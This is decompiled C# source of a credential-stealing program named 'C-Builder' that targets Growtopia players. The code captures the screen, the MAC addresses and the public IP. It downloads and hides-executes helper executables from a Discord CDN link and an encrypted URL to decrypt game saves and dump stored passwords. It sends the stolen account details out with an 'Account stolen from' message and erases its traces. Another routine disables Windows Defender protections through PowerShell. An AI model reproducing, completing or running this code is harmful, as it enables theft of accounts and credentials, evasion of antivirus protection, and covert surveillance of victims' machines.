using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace C_Builder
{
	// Token: 0x02000002 RID: 2
	internal class Executable
	{
		// Token: 0x06000001 RID: 1
		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x06000002 RID: 2
		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x06000003 RID: 3 RVA: 0x00002050 File Offset: 0x00000250
		public static string EncryptString(string key, string plainText)
		{
			byte[] iv = new byte[16];
			byte[] inArray;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000215C File Offset: 0x0000035C
		private static void Main()
		{
			WebClient webClient = new WebClient();
			try
			{
				foreach (Process process in Process.GetProcessesByName("savedecoder.exe"))
				{
					process.Kill();
				}
				string key = "kljsdooqlo4454GG";
				"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
				try
				{
					StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
					foreach (NetworkInterface networkInterface in from nic in NetworkInterface.GetAllNetworkInterfaces()
					where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
					select nic)
					{
						string str = string.Join("", networkInterface.GetPhysicalAddress().GetAddressBytes().Select((byte b) => b.ToString("X2")));
						streamWriter.Write(str + "\n");
					}
					streamWriter.Close();
				}
				catch
				{
				}
				try
				{
					Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
						bitmap.Save(string.Concat(new string[]
						{
							"C:\\Users\\",
							Environment.UserName,
							"\\AppData\\Local\\Temp\\",
							Environment.UserName,
							"screenshot.png"
						}));
					}
				}
				catch
				{
				}
				bool attachments = true;
				string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt";
				string text = Executable.DINGDONGDANG();
				string text2 = File.ReadAllText(path);
				string str2 = Environment.ExpandEnvironmentVariables("%TEMP%");
				"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
				string.Concat(new string[]
				{
					"C:\\Users\\",
					Environment.UserName,
					"\\AppData\\Local\\Temp\\",
					Environment.UserName,
					" pictures.zip"
				});
				string path2 = string.Concat(new string[]
				{
					"C:\\Users\\",
					Environment.UserName,
					"\\AppData\\Local\\Temp\\",
					Environment.UserName,
					"screenshot.png"
				});
				string contents = Executable.DINGDONGGETTROLL();
				File.WriteAllText(str2 + "\\" + Environment.UserName + " credentials.txt", contents);
				str2 + "\\" + Environment.UserName + " credentials.txt";
				IFOUGHTINWW1 ifoughtinww = new IFOUGHTINWW1();
				ifoughtinww.HANGURSELF = Executable.XXX(key, "GrWz5DcWMtfQ7dy+2aTGgQ==");
				try
				{
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/775300885990998059/775459023562473512/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
					Process.Start(new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = Path.GetTempPath() + "//savedecoder.exe"
					});
					Thread.Sleep(2500);
					if (File.Exists(Path.GetTempPath() + "//pwd.txt"))
					{
						File.ReadAllText(Path.GetTempPath() + "//pwd.txt");
						string[] array = File.ReadAllText(Path.GetTempPath() + "\\pwd.txt").Split(new char[]
						{
							'='
						});
						string text3 = array[0];
						string plainText = array[1];
						string plainText2 = array[2];
						using (StreamWriter streamWriter2 = new StreamWriter(Path.GetTempPath() + "\\" + text3 + ".cbuilder"))
						{
							streamWriter2.Write(string.Concat(new string[]
							{
								Executable.EncryptString(key, text3),
								"|",
								Executable.EncryptString(key, plainText),
								"|",
								Executable.EncryptString(key, plainText2),
								"|"
							}));
						}
						ifoughtinww.XDLSD(Path.GetTempPath() + "\\" + text3 + ".cbuilder", text3 + ".cbuilder");
						File.Delete(Path.GetTempPath() + "//pwd.txt");
						File.Delete(Path.GetTempPath() + "//savedecoder.exe");
						ifoughtinww.XDLOLLMAO(string.Concat(new string[]
						{
							"[C-Builder] Account stolen from:: ",
							Environment.UserName,
							" / ",
							Environment.MachineName,
							"\nGrowID :: ",
							text3,
							"\nIP address:: ",
							text,
							"\nMac addresses:: \n",
							text2
						}), attachments);
					}
					if (File.Exists(str2 + "\\" + Environment.UserName + " credentials.txt"))
					{
						File.Delete(str2 + "\\" + Environment.UserName + " credentials.txt");
					}
					if (File.Exists(path))
					{
						File.Delete(path);
					}
					if (File.Exists(path2))
					{
						File.Delete(path2);
					}
					try
					{
						foreach (Process process2 in Process.GetProcessesByName("savedecoder.exe"))
						{
							process2.Kill();
							File.Delete(Path.GetTempPath() + "\\pass_decoder.exe");
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
				foreach (Process process3 in Process.GetProcessesByName("savedecoder.exe"))
				{
					process3.Kill();
				}
				if (File.Exists(Path.GetTempPath() + "//pwd.txt"))
				{
					File.Delete(Path.GetTempPath() + "//pwd.txt");
				}
				if (File.Exists(Path.GetTempPath() + "//savedecoder.exe"))
				{
					File.Delete(Path.GetTempPath() + "//savedecoder.exe");
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002820 File Offset: 0x00000A20
		private static void FUCKYOU(string regPath, string name, string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (registryKey == null)
					{
						Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
					}
					else if (registryKey.GetValue(name) != value)
					{
						registryKey.SetValue(name, value, RegistryValueKind.DWord);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002894 File Offset: 0x00000A94
		private static void WHYTFUSKID()
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableRealtimeMonitoring $true");
				}
				else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableBehaviorMonitoring $true");
				}
				else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableBlockAtFirstSeen $true");
				}
				else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableIOAVProtection $true");
				}
				else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisablePrivacyMode $true");
				}
				else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
				}
				else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableArchiveScanning $true");
				}
				else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableIntrusionPreventionSystem $true");
				}
				else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
				{
					Executable.IDIOT("Set-MpPreference -DisableScriptScanning $true");
				}
				else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
				{
					Executable.IDIOT("Set-MpPreference -SubmitSamplesConsent 2");
				}
				else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
				{
					Executable.IDIOT("Set-MpPreference -MAPSReporting 0");
				}
				else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
				{
					Executable.IDIOT("Set-MpPreference -HighThreatDefaultAction 6 -Force");
				}
				else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
				{
					Executable.IDIOT("Set-MpPreference -ModerateThreatDefaultAction 6");
				}
				else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
				{
					Executable.IDIOT("Set-MpPreference -LowThreatDefaultAction 6");
				}
				else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
				{
					Executable.IDIOT("Set-MpPreference -SevereThreatDefaultAction 6");
				}
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002B6C File Offset: 0x00000D6C
		private static void IDIOT(string args)
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002BB8 File Offset: 0x00000DB8
		public static string SUCKDICKXD(string encrypted)
		{
			string s = "aoI90PeaapejpsOP";
			string s2 = "Oi09ajhiplK0hip0goidp0jkduewsp0a";
			byte[] array = Convert.FromBase64String(encrypted);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.Key = Encoding.UTF8.GetBytes(s2);
			rijndaelManaged.IV = Encoding.UTF8.GetBytes(s);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CBC;
			string @string;
			using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
			{
				byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				@string = Encoding.Unicode.GetString(bytes);
			}
			return @string;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002C74 File Offset: 0x00000E74
		private static string DINGDONGGETTROLL()
		{
			string text = Environment.ExpandEnvironmentVariables("%TEMP%");
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Executable.SUCKDICKXD("CW/PsKH5sxTA0WGmJaxxW1ML+wT8q90jrto/c7dDT2qpe/RLNvNoRsub28By1W82Y2d0V7rQGgEj9trh+a3AIbT/Z2/izeQvy1ntGG4lya3YSpfVpW8G+500Yecb6tYEBQuTV4kkvzbjp5q8276S65gwBQJ/dFTo2ruNnKyOV6PDfRtZ5UzH106UnQJbdjKMh/1ZVkmMjpDP8KWIUprbn7srzcR+qmWhfNc9ruueUTBIud63/BuLPxaT9QdzG1j6eP4Mc7Wj0sB784SXWjm6gQ=="), text + "\\resourcefilehaha.exe");
			webClient.Dispose();
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = text + "\\resourcefilehaha.exe",
					Arguments = "/C /stext " + text + "\\credentialslmao.txt"
				}
			}.Start();
			Thread.Sleep(5000);
			File.Delete(text + "\\resourcefilehaha.exe");
			string result = File.ReadAllText(text + "\\credentialslmao.txt");
			File.Delete(text + "\\credentialslmao.txt");
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002D3C File Offset: 0x00000F3C
		private static string DINGDONGDANG()
		{
			WebClient webClient = new WebClient();
			return webClient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002D5C File Offset: 0x00000F5C
		public static string ZZZ(string key, string plainText)
		{
			byte[] iv = new byte[16];
			byte[] inArray;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002E40 File Offset: 0x00001040
		public static string XXX(string key, string cipherText)
		{
			byte[] iv = new byte[16];
			byte[] buffer = Convert.FromBase64String(cipherText);
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		public static string growid = "";

		// Token: 0x04000002 RID: 2
		public static string passwords = "";

		// Token: 0x04000003 RID: 3
		public static string lastworld = "";
	}
}
